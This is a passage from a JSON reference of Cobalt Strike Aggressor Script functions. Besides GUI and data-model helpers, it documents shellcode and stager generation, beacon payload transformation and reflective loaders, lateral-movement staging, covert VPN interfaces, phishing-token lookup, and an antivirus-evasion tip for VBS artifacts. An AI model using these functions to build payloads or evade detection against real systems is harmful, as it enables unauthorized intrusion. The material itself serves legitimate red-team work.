    "signature": "redactobject",
    "anchors": [
      "redactobject"
    ]
  },
  "removeTab": {
    "description": "Close the active tab",
    "arguments": [],
    "returns": "",
    "example": "bind Ctrl+D {\nremoveTab();\n}",
    "notes": "",
    "signature": "removeTab",
    "anchors": [
      "removeTab"
    ]
  },
  "resetData": {
    "description": "Reset Cobalt Strike's data model.",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "resetData",
    "anchors": [
      "resetData"
    ]
  },
  "say": {
    "description": "Post a public chat message to the event log.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the message"
      }
    ],
    "returns": "",
    "example": "say(\"Hello World!\");",
    "notes": "",
    "signature": "say",
    "anchors": [
      "say"
    ]
  },
  "sbrowser": {
    "description": "Generate the session browser GUI component. Shows Beacon AND SSH sessions.",
    "arguments": [],
    "returns": "The session browser GUI object (a javax.swing.JComponent)",
    "example": "addVisualization(\"Session Browser\", sbrowser());\n\nSee also\n\n&showVisualization",
    "notes": "",
    "signature": "sbrowser",
    "anchors": [
      "sbrowser"
    ]
  },
  "screenshots_funcs": {
    "description": "Returns a list of screenshots from Cobalt Strike's data model.",
    "arguments": [],
    "returns": "An array of dictionary objects with information about each screenshot.",
    "example": "printAll(screenshots());",
    "notes": "",
    "signature": "screenshots",
    "anchors": [
      "screenshots_funcs"
    ]
  },
  "script_resource": {
    "description": "Returns the full path to a resource that is stored relative to this script file.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the file to get a path for"
      }
    ],
    "returns": "The full path to the specified file.",
    "example": "println(script_resource(\"dummy.txt\"));",
    "notes": "",
    "signature": "script_resource",
    "anchors": [
      "script_resource"
    ]
  },
  "separator": {
    "description": "Insert a separator into the current menu tree.",
    "arguments": [],
    "returns": "",
    "example": "popup foo {\nitem \"Stuff\" { ... }\nseparator();\nitem \"Other Stuff\" { ... }\n}",
    "notes": "",
    "signature": "separator",
    "anchors": [
      "separator"
    ]
  },
  "services": {
    "description": "Returns a list of services in Cobalt Strike's data model.",
    "arguments": [],
    "returns": "An array of dictionary objects with information about each service.",
    "example": "printAll(services());",
    "notes": "",
    "signature": "services",
    "anchors": [
      "services"
    ]
  },
  "setup_reflective_loader": {
    "description": "DEPRECATED This hook is no longer needed as the stomp loader style reflective loader is no longer supported.\n\nInsert the reflective loader executable code into a beacon payload.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Original beacon executable payload."
      },
      {
        "param": "$2",
        "desc": "User defined Reflective Loader executable data."
      }
    ],
    "returns": "The beacon executable payload updated with the user defined reflective loader. $null if there is an error.",
    "example": "See BEACON_RDLL_GENERATE hook\n\n# ---------------------------------------------------------------------\n# Replace the beacons default loader with '$loader'.\n# ---------------------------------------------------------------------\n$temp_dll = setup_reflective_loader($2, $loader);",
    "notes": "The user defined Reflective Loader must be less than 5k.",
    "signature": "setup_reflective_loader",
    "anchors": [
      "setup_reflective_loader"
    ]
  },
  "setup_strings": {
    "description": "Apply the strings defined in the Malleable C2 profile to the beacon payload.",
    "arguments": [
      {
        "param": "$1",
        "desc": "beacon payload to modify"
      }
    ],
    "returns": "The updated beacon payload with the defined strings applied to the payload.",
    "example": "See BEACON_RDLL_GENERATE hook\n\n# Apply strings to the beacon payload.\n$temp_dll = setup_strings($temp_dll);",
    "notes": "",
    "signature": "setup_strings",
    "anchors": [
      "setup_strings"
    ]
  },
  "setup_transformations": {
    "description": "Apply the transformations rules defined in the Malleable C2 profile to the beacon payload.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon payload to modify"
      },
      {
        "param": "$2",
        "desc": "Beacon architecture (x86/x64)"
      }
    ],
    "returns": "The updated beacon payload with the transformations applied to the payload.",
    "example": "See BEACON_RDLL_GENERATE hook\n\n# Apply the transformations to the beacon payload.\n$temp_dll = setup_transformations($temp_dll, $arch);",
    "notes": "",
    "signature": "setup_transformations",
    "anchors": [
      "setup_transformations"
    ]
  },
  "shellcode": {
    "description": "DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &stager instead.\n\nReturns raw shellcode for a specific Cobalt Strike listener",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name"
      },
      {
        "param": "$2",
        "desc": "true/false: is this shellcode destined for a remote target?"
      },
      {
        "param": "$3",
        "desc": "x86|x64 - the architecture of the stager output."
      }
    ],
    "returns": "A scalar containing shellcode for the specified listener.",
    "example": "$data = shellcode(\"my-listener\", false, \"x86\");\n\n$handle = openf(\">out.bin\");\nwriteb($handle, $data);\nclosef($handle);",
    "notes": "Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.",
    "signature": "shellcode",
    "anchors": [
      "shellcode"
    ]
  },
  "showVisualization": {
    "description": "Switch Cobalt Strike visualization to a registered visualization.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the name of the visualization"
      }
    ],
    "returns": "",
    "example": "bind Ctrl+H {\nshowVisualization(\"Hello World\");\n}\n\nSee also\n\n&showVisualization",
    "notes": "",
    "signature": "showVisualization",
    "anchors": [
      "showVisualization"
    ]
  },
  "show_error": {
    "description": "Shows an error message to the user in a dialog box. Use this function to relay error information.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the message text"
      }
    ],
    "returns": "",
    "example": "show_error(\"You did something bad.\");",
    "notes": "",
    "signature": "show_error",
    "anchors": [
      "show_error"
    ]
  },
  "show_message": {
    "description": "Shows a message to the user in a dialog box. Use this function to relay information.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the message text"
      }
    ],
    "returns": "",
    "example": "show_message(\"You've won a free ringtone\");",
    "notes": "",
    "signature": "show_message",
    "anchors": [
      "show_message"
    ]
  },
  "site_host": {
    "description": "Host content on Cobalt Strike's web server",
    "arguments": [
      {
        "param": "$1",
        "desc": "the host for this site (&localip is a good default)"
      },
      {
        "param": "$2",
        "desc": "the port (e.g., 80)"
      },
      {
        "param": "$3",
        "desc": "the URI (e.g., /foo)"
      },
      {
        "param": "$4",
        "desc": "the content to host (as a string)"
      },
      {
        "param": "$5",
        "desc": "the mime-type (e.g., \"text/plain\")"
      },
      {
        "param": "$6",
        "desc": "a description of the content. Shown in Site Management -> Manage."
      },
      {
        "param": "$7",
        "desc": "use SSL or not (true or false)"
      }
    ],
    "returns": "The URL to this hosted site",
    "example": "site_host(localip(), 80, \"/\", \"Hello World!\", \"text/plain\", \"Hello World Page\", false);",
    "notes": "",
    "signature": "site_host",
    "anchors": [
      "site_host"
    ]
  },
  "site_kill": {
    "description": "Remove a site from Cobalt Strike's web server",
    "arguments": [
      {
        "param": "$1",
        "desc": "the port"
      },
      {
        "param": "$2",
        "desc": "the URI"
      }
    ],
    "returns": "",
    "example": "# removes the content bound to / on port 80\nsite_kill(80, \"/\");",
    "notes": "",
    "signature": "site_kill",
    "anchors": [
      "site_kill"
    ]
  },
  "sites": {
    "description": "Returns a list of sites tied to Cobalt Strike's web server.",
    "arguments": [],
    "returns": "An array of dictionary objects with information about each registered site.",
    "example": "printAll(sites());",
    "notes": "",
    "signature": "sites",
    "anchors": [
      "sites"
    ]
  },
  "ssh_command_describe": {
    "description": "Describe an SSH command.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the command"
      }
    ],
    "returns": "A string description of the SSH command.",
    "example": "println(ssh_command_describe(\"sudo\"));",
    "notes": "",
    "signature": "ssh_command_describe",
    "anchors": [
      "ssh_command_describe"
    ]
  },
  "ssh_command_detail": {
    "description": "Get the help information for an SSH command.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the command"
      }
    ],
    "returns": "A string with helpful information about an SSH command.",
    "example": "println(ssh_command_detail(\"sudo\"));",
    "notes": "",
    "signature": "ssh_command_detail",
    "anchors": [
      "ssh_command_detail"
    ]
  },
  "ssh_command_group": {
    "description": "Register an SSH Help Group. A Help Group can assist with organizing the SSH console's help command output (see SSH console help help).\nGroups will not appear in help until you register commands for the group.\n\nAdded groups will reset when a client disconnects.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the group id (registers commands to the group). Do not include \",\" or \"@\" characters in group ids."
      },
      {
        "param": "$2",
        "desc": "group name"
      },
      {
        "param": "$3",
        "desc": "group description"
      }
    ],
    "returns": "",
    "example": "ssh_alis echo {\nblog($1, \"You typed: \" . substr($1, 5));\n}\n\nssh_command_group(\n\"ssh_help_group_id\",\n\"My SSH Group Name\",\n\"This is my example ssh help group\");\n\nssh_command_register(\n\"echo\",\n\"echo posts to the current session's log\",\n\"Synopsis: echo [arguments]\\n\\nLog arguments to the SSH console\",\n\"ssh_help_group_id\");",
    "notes": "",
    "signature": "ssh_command_group",
    "anchors": [
      "ssh_command_group"
    ]
  },
  "ssh_command_register": {
    "description": "Register help information for an SSH console command.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the command"
      },
      {
        "param": "$2",
        "desc": "the short description of the command"
      },
      {
        "param": "$3",
        "desc": "the long-form help for the command."
      },
      {
        "param": "$4",
        "desc": "(optional) the group id to assign the command. If the group id does not exist, it is ignored."
      }
    ],
    "returns": "",
    "example": "ssh_alias echo {\nblog($1, \"You typed: \" . substr($1, 5));\n}\n\nssh_command_group(\n\"ssh_help_group_id\",\n\"My SSH Help Group Name\",\n\"This is my example ssh help group\");\n\nssh_command_register(\n\"echo\", \n\"echo posts to the current session's log\", \n\"Synopsis: echo [arguments]\\n\\nLog arguments to the SSH console\");\n\"ssh_help_group_id\");",
    "notes": "",
    "signature": "ssh_command_register",
    "anchors": [
      "ssh_command_register"
    ]
  },
  "ssh_commands": {
    "description": "Get a list of SSH commands.",
    "arguments": [],
    "returns": "An array of SSH commands.",
    "example": "printAll(ssh_commands());",
    "notes": "",
    "signature": "ssh_commands",
    "anchors": [
      "ssh_commands"
    ]
  },
  "stager": {
    "description": "Returns the stager for a specific Cobalt Strike listener",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name"
      },
      {
        "param": "$2",
        "desc": "x86|x64 - the architecture of the stager output."
      }
    ],
    "returns": "A scalar containing shellcode for the specified listener.",
    "example": "$data = stager(\"my-listener\", \"x86\");\n\n$handle = openf(\">out.bin\");\nwriteb($handle, $data);\nclosef($handle);",
    "notes": "Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.",
    "signature": "stager",
    "anchors": [
      "stager"
    ]
  },
  "stager_bind_pipe": {
    "description": "Returns a bind_pipe stager for a specific Cobalt Strike listener. This stager is suitable for use in lateral movement actions that benefit from a small named pipe stager. Stage with &beacon_stage_pipe.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name"
      }
    ],
    "returns": "A scalar containing x86 bind_pipe shellcode.",
    "example": "# step 1. generate our stager\n$stager = stager_bind_pipe(\"my-listener\");\n\n# step 2. do something to run our stager\n\n# step 3. stage a payload via this stager\nbeacon_stage_pipe($bid, $target, \"my-listener\", \"x86\");\n\n# step 4. assume control of the payload (if needed)\nbeacon_link($bid, $target, \"my-listener\");\n\nSee also\n\n&artifact_general",
    "notes": "",
    "signature": "stager_bind_pipe",
    "anchors": [
      "stager_bind_pipe"
    ]
  },
  "stager_bind_tcp": {
    "description": "Returns a bind_tcp stager for a specific Cobalt Strike listener. This stager is suitable for use in localhost-only actions that require a small stager. Stage with &beacon_stage_tcp.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name"
      },
      {
        "param": "$2",
        "desc": "x86|x64 - the architecture of the stager output."
      },
      {
        "param": "$3",
        "desc": "the port to bind to"
      }
    ],
    "returns": "A scalar containing bind_tcp shellcode",
    "example": "# step 1. generate our stager\n$stager = stager_bind_tcp(\"my-listener\", \"x86\", 1234);\n\n# step 2. do something to run our stager\n\n# step 3. stage a payload via this stager\nbeacon_stage_tcp($bid, $target, 1234, \"my-listener\", \"x86\");\n\n# step 4. assume control of the payload (if needed)\nbeacon_link($bid, $target, \"my-listener\");\n\nSee also\n\n&artifact_general",
    "notes": "",
    "signature": "stager_bind_tcp",
    "anchors": [
      "stager_bind_tcp"
    ]
  },
  "str_chunk": {
    "description": "Chunk a string into multiple parts",
    "arguments": [
      {
        "param": "$1",
        "desc": "the string to chunk"
      },
      {
        "param": "$2",
        "desc": "the maximum size of each chunk"
      }
    ],
    "returns": "The original string split into multiple chunks",
    "example": "# hint... :)\nelse if ($1 eq \"template.x86.ps1\") {\nlocal('$enc');\n$enc = str_chunk(base64_encode($2), 61);\nreturn strrep($data, '%%DATA%%', join(\"' + '\", $enc));\n}",
    "notes": "",
    "signature": "str_chunk",
    "anchors": [
      "str_chunk"
    ]
  },
  "str_decode": {
    "description": "Convert a string of bytes to text with the specified encoding.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the string to decode"
      },
      {
        "param": "$2",
        "desc": "the encoding to use."
      }
    ],
    "returns": "The decoded text.",
    "example": "# convert back to a string we can use (from UTF16-LE)\n$text = str_decode($string, \"UTF16-LE\");",
    "notes": "",
    "signature": "str_decode",
    "anchors": [
      "str_decode"
    ]
  },
  "str_encode": {
    "description": "Convert text to byte string with the specified character encoding.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the string to encode"
      },
      {
        "param": "$2",
        "desc": "the encoding to use"
      }
    ],
    "returns": "The resulting string.",
    "example": "# convert to UTF16-LE\n$encoded = str_encode(\"this is some text\", \"UTF16-LE\");",
    "notes": "",
    "signature": "str_encode",
    "anchors": [
      "str_encode"
    ]
  },
  "str_xor": {
    "description": "Walk a string and XOR it with the provided key.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the string to mask"
      },
      {
        "param": "$2",
        "desc": "the key to use (string)"
      }
    ],
    "returns": "The original string masked with the specified key.",
    "example": "$mask = str_xor(\"This is a string\", \"key\");\n$plain = str_xor($mask, \"key\");",
    "notes": "",
    "signature": "str_xor",
    "anchors": [
      "str_xor"
    ]
  },
  "sync_download": {
    "description": "Sync a downloaded file (View -> Downloads) to a local path.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the remote path to the file to sync. See &downloads"
      },
      {
        "param": "$2",
        "desc": "where to save the file locally"
      },
      {
        "param": "$3",
        "desc": "(optional) a callback function to execute when download is synced. The first argument to this function is the local path of the downloaded file."
      }
    ],
    "returns": "",
    "example": "# sync all downloads\ncommand ga {\nlocal('$download $lpath $name $count');\nforeach $count => $download (downloads()) {\n($lpath, $name) = values($download, @(\"lpath\", \"name\"));\n\nsync_download($lpath, script_resource(\"file $+ .$count\"), lambda({ \nprintln(\"Downloaded $1 [ $+ $name $+ ]\"); \n}, \\$name));\n}\n}",
    "notes": "",
    "signature": "sync_download",
    "anchors": [
      "sync_download"
    ]
  },
  "targets": {
    "description": "Returns a list of host information in Cobalt Strike's data model.",
    "arguments": [],
    "returns": "An array of dictionary objects with information about each host.",
    "example": "printAll(targets());",
    "notes": "",
    "signature": "targets",
    "anchors": [
      "targets"
    ]
  },
  "tbrowser": {
    "description": "Generate the target browser GUI component.",
    "arguments": [],
    "returns": "The target browser GUI object (a javax.swing.JComponent)",
    "example": "addVisualization(\"Target Browser\", tbrowser());\n\nSee also\n\n&showVisualization",
    "notes": "",
    "signature": "tbrowser",
    "anchors": [
      "tbrowser"
    ]
  },
  "tokenToEmail": {
    "description": "Covert a phishing token to an email address.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the phishing token"
      }
    ],
    "returns": "The email address or \"unknown\" if the token is not associated with an email.",
    "example": "set PROFILER_HIT {\nlocal('$out $app $ver $email');\n$email = tokenToEmail($5); \n$out = \"\\c9[+]\\o $1 $+ / $+ $2 [ $+ $email $+ ] Applications\";\nforeach $app => $ver ($4) {\n$out .= \"\\n\\t $+ $[25]app $ver\";\n}\nreturn \"$out $+ \\n\\n\";\n}",
    "notes": "",
    "signature": "tokenToEmail",
    "anchors": [
      "tokenToEmail"
    ]
  },
  "transform": {
    "description": "Transform shellcode into another format.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the shellcode to transform"
      },
      {
        "param": "$2",
        "desc": "the transform to apply"
      }
    ],
    "returns": "The shellcode after the specified transform is applied",
    "example": "println(transform(\"This is a test!\", \"veil\"));",
    "notes": "",
    "signature": "transform",
    "anchors": [
      "transform"
    ]
  },
  "transform_vbs": {
    "description": "Transform shellcode into a VBS expression that results in a string",
    "arguments": [
      {
        "param": "$1",
        "desc": "the shellcode to transform"
      },
      {
        "param": "$2",
        "desc": "the maximum length of a plaintext run"
      }
    ],
    "returns": "The shellcode after this transform is applied",
    "example": "println(transform_vbs(\"This is a test!\", \"3\"));",
    "notes": "- Previously, Cobalt Strike would embed its stagers into VBS files as several Chr() calls concatenated into a string. \n\n- Cobalt Strike 3.9 introduced features that required larger stagers. These larger stagers were too big to embed into a VBS file with the above method.\n\n- To get past this VBS limitation, Cobalt Strike opted to use Chr() calls for non-ASCII data and runs of double-quoted strings for printable characters.\n\n- This change, an engineering necessity, unintentionally defeated static anti-virus signatures for Cobalt Strike's default VBS artifacts at that time.\n\n- If you're looking for an easy evasion benefit with VBS artifacts, consider adjusting the plaintext run length in your Resource Kit.",
    "signature": "transform_vbs",
    "anchors": [
      "transform_vbs"
    ]
  },
  "tstamp": {
    "description": "Format a time into a date/time value. This value does not include seconds.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the time [milliseconds since the UNIX epoch]"
      }
    ],
    "returns": "",
    "example": "println(\"The time is now: \" . tstamp(ticks()));\n\nSee also\n\n&dstamp",
    "notes": "",
    "signature": "tstamp",
    "anchors": [
      "tstamp"
    ]
  },
  "unbind": {
    "description": "Remove a keyboard shortcut binding.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the keyboard shortcut"
      }
    ],
    "returns": "",
    "example": "# restore default behavior of Ctrl+Left and Ctrl+Right\nunbind(\"Ctrl+Left\");\nunbind(\"Ctrl+Right\");\n\nSee also\n\n&bind",
    "notes": "",
    "signature": "unbind",
    "anchors": [
      "unbind"
    ]
  },
  "url_open": {
    "description": "Open a URL in the default browser.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the URL to open"
      }
    ],
    "returns": "",
    "example": "command go {\nurl_open(\"https://www.cobaltstrike.com/\");\n}",
    "notes": "",
    "signature": "url_open",
    "anchors": [
      "url_open"
    ]
  },
  "users": {
    "description": "Returns a list of users connected to this team server.",
    "arguments": [],
    "returns": "An array of users.",
    "example": "foreach $user (users()) {\nprintln($user);\n}",
    "notes": "",
    "signature": "users",
    "anchors": [
      "users"
    ]
  },
  "vpn_interface_info": {
    "description": "Get information about a VPN interface.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the interface name"
      },
      {
        "param": "$2",
        "desc": "[Optional] the key to extract a value for"
      }
    ],
    "returns": "%info = vpn_interface_info(\"interface\");\n\nReturns a dictionary with the metadata for this interface.\n\n$value = vpn_interface_info(\"interface\", \"key\");\n\nReturns the value for the specified key from this interface's metadata",
    "example": "# create a script console alias to interface info\ncommand interface {\nprintln(\"Interface $1\");\nforeach $key => $value (vpn_interface_info($1)) {\nprintln(\"$[15]key $value\");\n}\n}",
    "notes": "",
    "signature": "vpn_interface_info",
    "anchors": [
      "vpn_interface_info"
    ]
  },
  "vpn_interfaces": {
    "description": "Return a list of VPN interface names",
    "arguments": [],
    "returns": "An array of interface names.",
    "example": "printAll(vpn_interfaces());",
    "notes": "",
    "signature": "vpn_interfaces",
    "anchors": [
      "vpn_interfaces"
    ]
  },
  "vpn_tap_create": {
    "description": "Create a Covert VPN interface on the team server system.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the interface name (e.g., phear0)"
      },
      {
        "param": "$2",
        "desc": "the MAC address ($null will make a random MAC address)"
      },
      {
        "param": "$3",
        "desc": "reserved; use $null for now."
      },
      {
        "param": "$4",
        "desc": "the port to bind the VPN's channel to"
      },
      {
        "param": "$5",
        "desc": "the type of channel [bind, http, icmp, reverse, udp]"
      }
    ],
    "returns": "",
    "example": "vpn_tap_create(\"phear0\", $null, $null, 7324, \"udp\");",
    "notes": "",
    "signature": "vpn_tap_create",
    "anchors": [
      "vpn_tap_create"
    ]
  },
  "vpn_tap_delete": {
    "description": "Destroy a Covert VPN interface",
    "arguments": [
      {
        "param": "$1",
        "desc": "the interface name (e.g., phear0)"
      }
    ],
    "returns": "",
    "example": "vpn_tap_destroy(\"phear0\");\n\nBack to Top\n\nCopyright © Fortra, LLC and its group of companies.\nAll trademarks and registered trademarks are the property of their respective owners.\n4.12 | 202512020845 | December 2025",
    "notes": "",
    "signature": "vpn_tap_delete",
    "anchors": [
      "vpn_tap_delete"
    ]
  }
}